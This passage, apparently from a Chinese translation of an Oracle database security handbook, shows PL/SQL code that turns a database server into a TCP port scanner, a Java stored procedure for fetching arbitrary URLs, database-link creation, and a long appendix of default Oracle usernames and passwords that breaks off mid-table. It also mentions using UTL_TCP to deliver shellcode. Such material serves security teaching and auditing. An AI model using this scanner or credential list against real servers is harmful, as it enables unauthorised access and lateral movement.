AC020094E6B32C08000000”。</p><p>这些混淆方法可用于带内和带外方法。</p><h3 id="攻击网络上的其他系统"><a href="#攻击网络上的其他系统" class="headerlink" title="攻击网络上的其他系统"></a>攻击网络上的其他系统</h3><p>您刚刚看到 UTL_TCP 可用于在任意 TCP 端口上创建与网络上其他主机的连接。 可以编写脚本将 Oracle 数据库服务器变成 TCP 端口扫描器（可能是有史以来最昂贵的！）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE PACKAGE TCP_SCAN IS</span><br><span class="line">PROCEDURE SCAN(HOST VARCHAR2, START_PORT NUMBER, END_PORT NUMBER,</span><br><span class="line">VERBOSE NUMBER DEFAULT 0);</span><br><span class="line">PROCEDURE CHECK_PORT(HOST VARCHAR2, TCP_PORT NUMBER, VERBOSE NUMBER</span><br><span class="line">DEFAULT 0);</span><br><span class="line">END TCP_SCAN;</span><br><span class="line">/</span><br><span class="line">SHOW ERRORS</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PACKAGE BODY TCP_SCAN IS</span><br><span class="line">PROCEDURE SCAN(HOST VARCHAR2, START_PORT NUMBER, END_PORT NUMBER,</span><br><span class="line">VERBOSE NUMBER DEFAULT 0) AS</span><br><span class="line">I NUMBER := START_PORT;</span><br><span class="line">BEGIN</span><br><span class="line">      FOR I IN START_PORT..END_PORT LOOP</span><br><span class="line">            CHECK_PORT(HOST,I,VERBOSE);</span><br><span class="line">      END LOOP;</span><br><span class="line"></span><br><span class="line">EXCEPTION WHEN OTHERS THEN</span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(&#x27;An error occurred.&#x27;);</span><br><span class="line">END SCAN;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PROCEDURE CHECK_PORT(HOST VARCHAR2, TCP_PORT NUMBER, VERBOSE NUMBER</span><br><span class="line">DEFAULT 0) AS</span><br><span class="line">CN SYS.UTL_TCP.CONNECTION;</span><br><span class="line">NETWORK_ERROR EXCEPTION;</span><br><span class="line">PRAGMA EXCEPTION_INIT(NETWORK_ERROR,-29260);</span><br><span class="line">BEGIN</span><br><span class="line">      DBMS_OUTPUT.ENABLE(1000000);</span><br><span class="line">      CN := UTL_TCP.OPEN_CONNECTION(HOST, TCP_PORT);</span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(&#x27;TCP Port &#x27; || TCP_PORT || &#x27; on &#x27; || HOST ||</span><br><span class="line">&#x27; is open.&#x27;);</span><br><span class="line">      UTL_TCP.CLOSE_CONNECTION(CN);</span><br><span class="line">EXCEPTION WHEN NETWORK_ERROR THEN</span><br><span class="line">      IF VERBOSE !=0 THEN</span><br><span class="line">            DBMS_OUTPUT.PUT_LINE(&#x27;TCP Port &#x27; || TCP_PORT || &#x27; on &#x27; ||</span><br><span class="line">HOST || &#x27; is not open.&#x27;);</span><br><span class="line">      END IF;</span><br><span class="line">      WHEN OTHERS THEN</span><br><span class="line">            DBMS_OUTPUT.PUT_LINE(&#x27;There was an error.&#x27;);</span><br><span class="line">END CHECK_PORT;</span><br><span class="line"></span><br><span class="line">END TCP_SCAN;</span><br><span class="line">/</span><br><span class="line">SHOW ERRORS</span><br><span class="line">/</span><br><span class="line">EXEC TCP_SCAN.SCAN(&#x27;192.168.0.10&#x27;,1,200,1);</span><br></pre></td></tr></table></figure><p>UTL_TCP 还可以用作 shellcode 的传递机制，利用其他网络服务器中的缓冲区溢出漏洞——例如，Windows 系统上的 IRemoteActivation 溢出或 Solaris in.lpd 溢出。</p><h3 id="Java和网络"><a href="#Java和网络" class="headerlink" title="Java和网络"></a>Java和网络</h3><p>当然，您可以使用 Java 使用套接字或其他预先打包的网络类（如 URL）来连接网络，但要这样做，用户需要连接并解析 java.net.SocketPermission：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec dbms_java.grant_permission(&#x27;SCOTT&#x27;, &#x27;SYS:java.net.SocketPermission&#x27;,&#x27;*&#x27;, &#x27;connect, resolve&#x27;);</span><br></pre></td></tr></table></figure><p>一旦你有了它，你就可以连接到任何主机——这在前面的语句中用星号表示。 以下代码使用 URL 类使您能够连接到 Web 服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVAURL&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.net.*;</span><br><span class="line"></span><br><span class="line">public class JAVAURL</span><br><span class="line">&#123;</span><br><span class="line">      public static void getUrl (String purl) throws IOException</span><br><span class="line">       &#123;</span><br><span class="line">              try</span><br><span class="line">              &#123;</span><br><span class="line">                  URL url = new URL(purl);</span><br><span class="line">                  InputStream is = url.openStream();</span><br><span class="line">                  BufferedInputStream bis = new BufferedInputStream(is);</span><br><span class="line">                  int page;</span><br><span class="line"></span><br><span class="line">                  while(true)</span><br><span class="line">                  &#123;</span><br><span class="line">                        page = bis.read();</span><br><span class="line">                        if(page == -1)</span><br><span class="line">                              break;</span><br><span class="line">                        System.out.print((char)page);</span><br><span class="line">                  &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (MalformedURLException mue)</span><br><span class="line">            &#123;</span><br><span class="line">                  System.err.println (&quot;Invalid URL&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (IOException io)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                  System.err.println (&quot;Read Error -&quot; + io);</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVAURLPROC (purl IN VARCHAR2)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVAURL.getUrl (java.lang.String)&#x27;;</span><br><span class="line">/</span><br><span class="line">set serveroutput on</span><br><span class="line">exec dbms_java.set_output(2000);</span><br><span class="line">exec javaurlproc(&#x27;http://www.databasesecurity.com/&#x27;);</span><br></pre></td></tr></table></figure><h3 id="数据库链接"><a href="#数据库链接" class="headerlink" title="数据库链接"></a>数据库链接</h3><p>当涉及到网络上的其他 Oracle 数据库服务器时，可以使用数据库链接。 数据库链接是一种特殊的数据库对象，它将一个 Oracle 服务器连接到另一个。 它是使用 CREATE DATABASE LINK 语句创建的。 链接可以共享，即公共或私有。 以下将创建一个私人链接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create database link remote_db connect to scott identified by tiger</span><br><span class="line">using &#x27;(DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)</span><br><span class="line">(HOST=192.168.0.120)(PORT=1521))(CONNECT_DATA=</span><br><span class="line"></span><br><span class="line">(SERVICE_NAME=orcl.ngssoftware.com)))&#x27;;</span><br></pre></td></tr></table></figure><p>已创建数据库链接。 创建后，可以使用 @ 符号查询链接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt;SELECT USERNAME FROM ALL_USERS@REMOTE_DB</span><br></pre></td></tr></table></figure><p>如果用户名和密码正确，第一个服务器将连接到第二个服务器并查询 ALL_USERS 表。</p><h2 id="附录A-默认用户名和密码"><a href="#附录A-默认用户名和密码" class="headerlink" title="附录A-默认用户名和密码"></a>附录A-默认用户名和密码</h2><p>Oracle 以安装大量带有默认密码的默认用户帐户而闻名。 尽管 Oracle 10g 的情况有所改善，但仍有许多数据库服务器使用默认帐户。 下表列出了默认用户名和密码。</p><table><thead><tr><th><strong>USERNAME</strong></th><th><strong>PASSWORD</strong></th></tr></thead><tbody><tr><td>AASH</td><td>AASH</td></tr><tr><td>ABA1</td><td>ABA1</td></tr><tr><td>ABM</td><td>ABM</td></tr><tr><td>ADAMS</td><td>WOOD</td></tr><tr><td>ADS</td><td>ADS</td></tr><tr><td>ADSEUL_US</td><td>WELCOME</td></tr><tr><td>AHL</td><td>AHL</td></tr><tr><td>AHM</td><td>AHM</td></tr><tr><td>AK</td><td>AK</td></tr><tr><td>AL</td><td>AL</td></tr><tr><td>ALA1</td><td>ALA1</td></tr><tr><td>ALLUSERS</td><td>ALLUSERS</td></tr><tr><td>ALR</td><td>ALR</td></tr><tr><td>AMA1</td><td>AMA1</td></tr><tr><td>AMA2</td><td>AMA2</td></tr><tr><td>AMA3</td><td>AMA3</td></tr><tr><td>AMA4</td><td>AMA4</td></tr><tr><td>AMF</td><td>AMF</td></tr><tr><td>AMS</td><td>AMS</td></tr><tr><td>AMS1</td><td>AMS1</td></tr><tr><td>AMS2</td><td>AMS2</td></tr><tr><td>AMS3</td><td>AMS3</td></tr><tr><td>AMS4</td><td>AMS4</td></tr><tr><td>AMSYS</td><td>AMSYS</td></tr><tr><td>AMV</td><td>AMV</td></tr><tr><td>AMW</td><td>AMW</td></tr><tr><td>ANNE</td><td>ANNE</td></tr><tr><td>AOLDEMO</td><td>AOLDEMO</td></tr><tr><td>AP</td><td>AP</td></tr><tr><td>APA1</td><td>APA1</td></tr><tr><td>APA2</td><td>APA2</td></tr><tr><td>APA3</td><td>APA3</td></tr><tr><td>APA4</td><td>APA4</td></tr><tr><td>APPLEAD</td><td>APPLEAD</td></tr><tr><td>APPLSYS</td><td>FND</td></tr><tr><td>APPLSYS</td><td>APPS</td></tr><tr><td>APPLSYSPUB</td><td>PUB</td></tr><tr><td>APPS</td><td>APPS</td></tr><tr><td>APS1</td><td>APS1</td></tr><tr><td>APS2</td><td>APS2</td></tr><tr><td>APS3</td><td>APS3</td></tr><tr><td>APS4</td><td>APS4</td></tr><tr><td>AQDEMO</td><td>AQDEMO</td></tr><tr><td>AQJAVA</td><td>AQJAVA</td></tr><tr><td>AQUSER</td><td>AQUSER</td></tr><tr><td>AR</td><td>AR</td></tr><tr><td>ARA1</td><td>ARA1</td></tr><tr><td>ARA2</td><td>ARA2</td></tr><tr><td>ARA3</td><td>ARA3</td></tr><tr><td>ARA4</td><td>ARA4</td></tr><tr><td>ARS1</td><td>ARS1</td></tr><tr><td>ARS2</td><td>ARS2</td></tr><tr><td>ARS3</td><td>ARS3</td></tr><tr><td>ARS4</td><td>ARS4</td></tr><tr><td>ART</td><td>ART</td></tr><tr><td>ASF</td><td>ASF</td></tr><tr><td>ASG</td><td>ASG</td></tr><tr><td>ASL</td><td>ASL</td></tr><tr><td>ASN</td><td>ASN</td></tr><tr><td>ASO</td><td>ASO</td></tr><tr><td>ASP</td><td>ASP</td></tr><tr><td>AST</td><td>AST</td></tr><tr><td>AUC_GUEST</td><td>AUC_GUEST</td></tr><tr><td>AURORA$ORB$UNAUTHENTICATED</td><td>INVALID</td></tr><tr><td>AUTHORIA</td><td>AUTHORIA</td></tr><tr><td>AX</td><td>AX</td></tr><tr><td>AZ</td><td>AZ</td></tr><tr><td>B2B</td><td>B2B</td></tr><tr><td>BAM</td><td>BAM</td></tr><tr><td>BCA1</td><td>BCA1</td></tr><tr><td>BCA2</td><td>BCA2</td></tr><tr><td>BEN</td><td>BEN</td></tr><tr><td>BIC</td><td>BIC</td></tr><tr><td>BIL</td><td>BIL</td></tr><tr><td>BIM</td><td>BIM</td></tr><tr><td>BIS</td><td>BIS</td></tr><tr><td>BIV</td><td>BIV</td></tr><tr><td>BIX</td><td>BIX</td></tr><tr><td>BLAKE</td><td>PAPER</td></tr><tr><td>BMEADOWS</td><td>BMEADOWS</td></tr><tr><td>BNE</td><td>BNE</td></tr><tr><td>BOM</td><td>BOM</td></tr><tr><td>BP01</td><td>BP01</td></tr><tr><td>BP02</td><td>BP02</td></tr><tr><td>BP03</td><td>BP03</td></tr><tr><td>BP04</td><td>BP04</td></tr><tr><td>BP05</td><td>BP05</td></tr><tr><td>BP06</td><td>BP06</td></tr><tr><td>BSC</td><td>BSC</td></tr><tr><td>BUYACCT</td><td>BUYACCT</td></tr><tr><td>BUYAPPR1</td><td>BUYAPPR1</td></tr><tr><td>BUYAPPR2</td><td>BUYAPPR2</td></tr><tr><td>BUYAPPR3</td><td>BUYAPPR3</td></tr><tr><td>BUYER</td><td>BUYER</td></tr><tr><td>BUYMTCH</td><td>BUYMTCH</td></tr><tr><td>CAMRON</td><td>CAMRON</td></tr><tr><td>CANDICE</td><td>CANDICE</td></tr><tr><td>CARL</td><td>CARL</td></tr><tr><td>CARLY</td><td>CARLY</td></tr><tr><td>CARMEN</td><td>CARMEN</td></tr><tr><td>CARRIECONYERS</td><td>CARRIECONYERS</td></tr><tr><td>CATADMIN</td><td>CATADMIN</td></tr><tr><td>CE</td><td>CE</td></tr><tr><td>CEASAR</td><td>CEASAR</td></tr><tr><td>CENTRA</td><td>CENTRA</td></tr><tr><td>CFD</td><td>CFD</td></tr><tr><td>CHANDRA</td><td>CHANDRA</td></tr><tr><td>CHARLEY</td><td>CHARLEY</td></tr><tr><td>CHRISBAKER</td><td>CHRISBAKER</td></tr><tr><td>CHRISTIE</td><td>CHRISTIE</td></tr><tr><td>CINDY</td><td>CINDY</td></tr><tr><td>CLARK</td><td>CLARK</td></tr><tr><td>CLARK</td><td>CLOTH</td></tr><tr><td>CLAUDE</td><td>CLAUDE</td></tr><tr><td>CLINT</td><td>CLINT</td></tr><tr><td>CLN</td><td>CLN</td></tr><tr><td>CN</td><td>CN</td></tr><tr><td>CNCADMIN</td><td>CNCADMIN</td></tr><tr><td>CONNIE</td><td>CONNIE</td></tr><tr><td>CONNOR</td><td>CONNOR</td></tr><tr><td>CORY</td><td>CORY</td></tr><tr><td>CRM1</td><td>CRM1</td></tr><tr><td>CRM2</td><td>CRM2</td></tr><tr><td>CRP</td><td>CRP</td></tr><tr><td>CRPB733</td><td>CRPB733</td></tr><tr><td>CRPCTL</td><td>CRPCTL</td></tr><tr><td>CRPDTA</td><td>CRPDTA</td></tr><tr><td>CS</td><td>CS</td></tr><tr><td>CSADMIN</td><td>CSADMIN</td></tr><tr><td>CSAPPR1</td><td>CSAPPR1</td></tr><tr><td>CSC</td><td>CSC</td></tr><tr><td>CSD</td><td>CSD</td></tr><tr><td>CSDUMMY</td><td>CSDUMMY</td></tr><tr><td>CSE</td><td>CSE</td></tr><tr><td>CSF</td><td>CSF</td></tr><tr><td>CSI</td><td>CSI</td></tr><tr><td>CSL</td><td>CSL</td></tr><tr><td>CSM</td><td>CSM</td></tr><tr><td>CSMIG</td><td>CSMIG</td></tr><tr><td>CSP</td><td>CSP</td></tr><tr><td>CSR</td><td>CSR</td></tr><tr><td>CSS</td><td>CSS</td></tr><tr><td>CTXDEMO</td><td>CTXDEMO</td></tr><tr><td>CTXSYS</td><td>CTXSYS</td></tr><tr><td>CTXSYS</td><td>CHANGE_ON_INSTALL</td></tr><tr><td>CTXTEST</td><td>CTXTEST</td></tr><tr><td>CUA</td><td>CUA</td></tr><tr><td>CUE</td><td>CUE</td></tr><tr><td>CUF</td><td>CUF</td></tr><tr><td>CUG</td><td>CUG</td></tr><tr><td>CUI</td><td>CUI</td></tr><tr><td>CUN</td><td>CUN</td></tr><tr><td>CUP</td><td>CUP</td></tr><tr><td>CUS</td><td>CUS</td></tr><tr><td>CZ</td><td>CZ</td></tr><tr><td>DAVIDMORGAN</td><td>DAVIDMORGAN</td></tr><tr><td>DBSNMP</td><td>DBSNMP</td></tr><tr><td>DCM</td><td>DCM</td></tr><tr><td>DD7333</td><td>DD7333</td></tr><tr><td>DD7334</td><td>DD7334</td></tr><tr><td>DD810</td><td>DD810</td></tr><tr><td>DD811</td><td>DD811</td></tr><tr><td>DD812</td><td>DD812</td></tr><tr><td>DD9</td><td>DD9</td></tr><tr><td>DDB733</td><td>DDB733</td></tr><tr><td>DDD</td><td>DDD</td></tr><tr><td>DEMO8</td><td>DEMO8</td></tr><tr><td>DES</td><td>DES</td></tr><tr><td>DES2K</td><td>DES2K</td></tr><tr><td>DEV2000_DEMOS</td><td>DEV2000_DEMOS</td></tr><tr><td>DEVB733</td><td>DEVB733</td></tr><tr><td>DEVUSER</td><td>DEVUSER</td></tr><tr><td>DGRAY</td><td>WELCOME</td></tr><tr><td>DIP</td><td>DIP</td></tr><tr><td>DISCOVERER5</td><td>DISCOVERER5</td></tr><tr><td>DKING</td><td>DKING</td></tr><tr><td>DLD</td><td>DLD</td></tr><tr><td>DMADMIN</td><td>MANAGER</td></tr><tr><td>DMATS</td><td>DMATS</td></tr><tr><td>DMS</td><td>DMS</td></tr><tr><td>DMSYS</td><td>DMSYS</td></tr><tr><td>DOM</td><td>DOM</td></tr><tr><td>DPOND</td><td>DPOND</td></tr><tr><td>DSGATEWAY</td><td>DSGATEWAY</td></tr><tr><td>DV7333</td><td>DV7333</td></tr><tr><td>DV7334</td><td>DV7334</td></tr><tr><td>DV810</td><td>DV810</td></tr><tr><td>DV811</td><td>DV811</td></tr><tr><td>DV812</td><td>DV812</td></tr><tr><td>DV9</td><td>DV9</td></tr><tr><td>DVP1</td><td>DVP1</td></tr><tr><td>EAA</td><td>EAA</td></tr><tr><td>EAM</td><td>EAM</td></tr><tr><td>EC</td><td>EC</td></tr><tr><td>ECX</td><td>ECX</td></tr><tr><td>EDR</td><td>EDR</td></tr><tr><td>EDWEUL_US</td><td>EDWEUL_US</td></tr><tr><td>EDWREP</td><td>EDWREP</td></tr><tr><td>EGC1</td><td>EGC1</td></tr><tr><td>EGD1</td><td>EGD1</td></tr><tr><td>EGM1</td><td>EGM1</td></tr><tr><td>EGO</td><td>EGO</td></tr><tr><td>EGR1</td><td>EGR1</td></tr><tr><td>END1</td><td>END1</td></tr><tr><td>ENG</td><td>ENG</td></tr><tr><td>ENI</td><td>ENI</td></tr><tr><td>ENM1</td><td>ENM1</td></tr><tr><td>ENS1</td><td>ENS1</td></tr><tr><td>ENTMGR_CUST</td><td>ENTMGR_CUST</td></tr><tr><td>ENTMGR_PRO</td><td>ENTMGR_PRO</td></tr><tr><td>ENTMGR_TRAIN</td><td>ENTMGR_TRAIN</td></tr><tr><td>EOPP_PORTALADM</td><td>EOPP_PORTALADM</td></tr><tr><td>EOPP_PORTALMGR</td><td>EOPP_PORTALMGR</td></tr><tr><td>EOPP_USER</td><td>EOPP_USER</td></tr><tr><td>EUL_US</td><td>EUL_US</td></tr><tr><td>EVM</td><td>EVM</td></tr><tr><td>EXA1</td><td>EXA1</td></tr><tr><td>EXA2</td><td>EXA2</td></tr><tr><td>EXA3</td><td>EXA3</td></tr><tr><td>EXA4</td><td>EXA4</td></tr><tr><td>EXFSYS</td><td>EXFSYS</td></tr><tr><td>EXS1</td><td>EXS1</td></tr><tr><td>EXS2</td><td>EXS2</td></tr><tr><td>EXS3</td><td>EXS3</td></tr><tr><td>EXS4</td><td>EXS4</td></tr><tr><td>FA</td><td>FA</td></tr><tr><td>FEM</td><td>FEM</td></tr><tr><td>FIA1</td><td>FIA1</td></tr><tr><td>FII</td><td>FII</td></tr><tr><td>FLM</td><td>FLM</td></tr><tr><td>FNI1</td><td>FNI1</td></tr><tr><td>FNI2</td><td>FNI2</td></tr><tr><td>FPA</td><td>FPA</td></tr><tr><td>FPT</td><td>FPT</td></tr><tr><td>FRM</td><td>FRM</td></tr><tr><td>FTA1</td><td>FTA1</td></tr><tr><td>FTE</td><td>FTE</td></tr><tr><td>FUN</td><td>FUN</td></tr><tr><td>FV</td><td>FV</td></tr><tr><td>FVP1</td><td>FVP1</td></tr><tr><td>GALLEN</td><td>GALLEN</td></tr><tr><td>GCA1</td><td>GCA1</td></tr><tr><td>GCA2</td><td>GCA2</td></tr><tr><td>GCA3</td><td>GCA3</td></tr><tr><td>GCA9</td><td>GCA9</td></tr><tr><td>GCMGR1</td><td>GCMGR1</td></tr><tr><td>GCMGR2</td><td>GCMGR2</td></tr><tr><td>GCMGR3</td><td>GCMGR3</td></tr><tr><td>GCS</td><td>GCS</td></tr><tr><td>GCS1</td><td>GCS1</td></tr><tr><td>GCS2</td><td>GCS2</td></tr><tr><td>GCS3</td><td>GCS3</td></tr><tr><td>GEORGIAWINE</td><td>GEORGIAWINE</td></tr><tr><td>GL</td><td>GL</td></tr><tr><td>GLA1</td><td>GLA1</td></tr><tr><td>GLA2</td><td>GLA2</td></tr><tr><td>GLA3</td><td>GLA3</td></tr><tr><td>GLA4</td><td>GLA4</td></tr><tr><td>GLS1</td><td>GLS1</td></tr><tr><td>GLS2</td><td>GLS2</td></tr><tr><td>GLS3</td><td>GLS3</td></tr><tr><td>GLS4</td><td>GLS4</td></tr><tr><td>GM_AWDA</td><td>GM_AWDA</td></tr><tr><td>GM_COPI</td><td>GM_COPI</td></tr><tr><td>GM_DPHD</td><td>GM_DPHD</td></tr><tr><td>GM_MLCT</td><td>GM_MLCT</td></tr><tr><td>GM_PLADMA</td><td>GM_PLADMA</td></tr><tr><td>GM_PLADMH</td><td>GM_PLADMH</td></tr><tr><td>GM_PLCCA</td><td>GM_PLCCA</td></tr><tr><td>GM_PLCCH</td><td>GM_PLCCH</td></tr><tr><td>GM_PLCOMA</td><td>GM_PLCOMA</td></tr><tr><td>GM_PLCOMH</td><td>GM_PLCOMH</td></tr><tr><td>GM_PLCONA</td><td>GM_PLCONA</td></tr><tr><td>GM_PLCONH</td><td>GM_PLCONH</td></tr><tr><td>GM_PLNSCA</td><td>GM_PLNSCA</td></tr><tr><td>GM_PLNSCH</td><td>GM_PLNSCH</td></tr><tr><td>GM_PLSCTA</td><td>GM_PLSCTA</td></tr><tr><td>GM_PLSCTH</td><td>GM_PLSCTH</td></tr><tr><td>GM_PLVET</td><td>GM_PLVET</td></tr><tr><td>GM_SPO</td><td>GM_SPO</td></tr><tr><td>GM_STKH</td><td>GM_STKH</td></tr><tr><td>GMA</td><td>GMA</td></tr><tr><td>GMD</td><td>GMD</td></tr><tr><td>GME</td><td>GME</td></tr><tr><td>GMF</td><td>GMF</td></tr><tr><td>GMI</td><td>GMI</td></tr><tr><td>GML</td><td>GML</td></tr><tr><td>GMP</td><td>GMP</td></tr><tr><td>GMS</td><td>GMS</td></tr><tr><td>GR</td><td>GR</td></tr><tr><td>GUEST</td><td>GUEST</td></tr><tr><td>HCC</td><td>HCC</td></tr><tr><td>HHCFO</td><td>HHCFO</td></tr><tr><td>HR</td><td>HR</td></tr><tr><td>HRI</td><td>HRI</td></tr><tr><td>HXC</td><td>HXC</td></tr><tr><td>HXT</td><td>HXT</td></tr><tr><td>IA</td><td>IA</td></tr><tr><td>IBA</td><td>IBA</td></tr><tr><td>IBC</td><td>IBC</td></tr><tr><td>IBE</td><td>IBE</td></tr><tr><td>IBP</td><td>IBP</td></tr><tr><td>IBU</td><td>IBU</td></tr><tr><td>IBY</td><td>IBY</td></tr><tr><td>ICX</td><td>ICX</td></tr><tr><td>IEB</td><td>IEB</td></tr><tr><td>IEC</td><td>IEC</td></tr><tr><td>IEM</td><td>IEM</td></tr><tr><td>IEO</td><td>IEO</td></tr><tr><td>IES</td><td>IES</td></tr><tr><td>IEU</td><td>IEU</td></tr><tr><td>IEX</td><td>IEX</td></tr><tr><td>IGC</td><td>IGC</td></tr><tr><td>IGF</td><td>IGF</td></tr><tr><td>IGI</td><td>IGI</td></tr><tr><td>IGS</td><td>IGS</td></tr><tr><td>IGW</td><td>IGW</td></tr><tr><td>IMC</td><td>IMC</td></tr><tr><td>IMT</td><td>IMT</td></tr><tr><td>INS1</td><td>INS1</td></tr><tr><td>INS2</td><td>INS2</td></tr><tr><td>INTERNET_APPSERVER_REGISTRY</td><td>INTERNET_APPSERVER_REGISTRY</td></tr><tr><td>INV</td><td>INV</td></tr><tr><td>IP</td><td>IP</td></tr><tr><td>IPA</td><td>IPA</td></tr><tr><td>IPD</td><td>IPD</td></tr><tr><td>ISC</td><td>ISC</td></tr><tr><td>ISTEWARD</td><td>ISTEWARD</td></tr><tr><td>ITG</td><td>ITG</td></tr><tr><td>JA</td><td>JA</td></tr><tr><td>JD7333</td><td>JD7333</td></tr><tr><td>JD7334</td><td>JD7334</td></tr><tr><td>JD9</td><td>JD9</td></tr><tr><td>JDE</td><td>JDE</td></tr><tr><td>JDEDBA</td><td>JDEDBA</td></tr><tr><td>JE</td><td>JE</td></tr><tr><td>JG</td><td>JG</td></tr><tr><td>JL</td><td>JL</td></tr><tr><td>JOHNINARI</td><td>JOHNINARI</td></tr><tr><td>JONES</td><td>STEEL</td></tr><tr><td>JTF</td><td>JTF</td></tr><tr><td>JTI</td><td>JTI</td></tr><tr><td>JTM</td><td>JTM</td></tr><tr><td>JTR</td><td>JTR</td></tr><tr><td>JTS</td><td>JTS</td></tr><tr><td>JUNK_PS</td><td>JUNK_PS</td></tr><tr><td>JUSTOSHUM</td><td>JUSTOSHUM</td></tr><tr><td>KELLYJONES</td><td>KELLYJONES</td></tr><tr><td>KEVINDONS</td><td>KEVINDONS</td></tr><tr><td>KPN</td><td>KPN</td></tr><tr><td>LADAMS</td><td>LADAMS</td></tr><tr><td>LBA</td><td>LBA</td></tr><tr><td>LBACSYS</td><td>LBACSYS</td></tr><tr><td>LDQUAL</td><td>LDQUAL</td></tr><tr><td>LHILL</td><td>LHILL</td></tr><tr><td>LNS</td><td>LNS</td></tr><tr><td>LQUINCY</td><td>LQUINCY</td></tr><tr><td>LSA</td><td>LSA</td></tr><tr><td>MDDATA</td><td>MDDATA</td></tr><tr><td>MDSYS</td><td>MDSYS</td></tr><tr><td>ME</td><td>ME</td></tr><tr><td>MFG</td><td>MFG</td></tr><tr><td>MGR1</td><td>MGR1</td></tr><tr><td>MGR2</td><td>MGR2</td></tr><tr><td>MGR3</td><td>MGR3</td></tr><tr><td>MGR4</td><td>MGR4</td></tr><tr><td>MIKEIKEGAMI</td><td>MIKEIKEGAMI</td></tr><tr><td>MJONES</td><td>MJONES</td></tr><tr><td>MLAKE</td><td>MLAKE</td></tr><tr><td>MM1</td><td>MM1</td></tr><tr><td>MM2</td><td>MM2</td></tr><tr><td>MM3</td><td>MM3</td></tr><tr><td>MM4</td><td>MM4</td></tr><tr><td>MM5</td><td>MM5</td></tr><tr><td>MMARTIN</td><td>MMARTIN</td></tr><tr><td>MOBILEADMIN</td><td>WELCOME</td></tr><tr><td>MRP</td><td>MRP</td></tr><tr><td>MSC</td><td>MSC</td></tr><tr><td>MSD</td><td>MSD</td></tr><tr><td>MSO</td><td>MSO</td></tr><tr><td>MSR</td><td>MSR</td></tr><tr><td>MST</td><td>MST</td></tr><tr><td>MWA</td><td>MWA</td></tr><tr><td>NEILKATSU</td><td>NEILKATSU</td></tr><tr><td>OBJ7333</td><td>OBJ7333</td></tr><tr><td>OBJ7334</td><td>OBJ7334</td></tr><tr><td>OBJB733</td><td>OBJB733</td></tr><tr><td>OCA</td><td>OCA</td></tr><tr><td>ODM</td><td>ODM</td></tr><tr><td>ODM_MTR</td><td>MTRPW</td></tr><tr><td>ODS</td><td>ODS</td></tr><tr><td>ODSCOMMON</td><td>ODSCOMMON</td></tr><tr><td>OE</td><td>OE</td></tr><tr><td>OKB</td><td>OKB</td></tr><tr><td>OKC</td><td>OKC</td></tr><tr><td>OKE</td><td>OKE</td></tr><tr><td>OKI</td><td>OKI</td></tr><tr><td>OKL</td><td>OKL</td></tr><tr><td>OKO</td><td>OKO</td></tr><tr><td>OKR</td><td>OKR</td></tr><tr><td>OKS</td><td>OKS</td></tr><tr><td>OKX</td><td>OKX</td></tr><tr><td>OL810</td><td>OL810</td></tr><tr><td>OL811</td><td>OL811</td></tr><tr><td>OL812</td><td>OL812</td></tr><tr><td>OL9</td><td>OL9</td></tr><tr><td>OLAPSYS</td><td>MANAGER</td></tr><tr><td>ONT</td><td>ONT<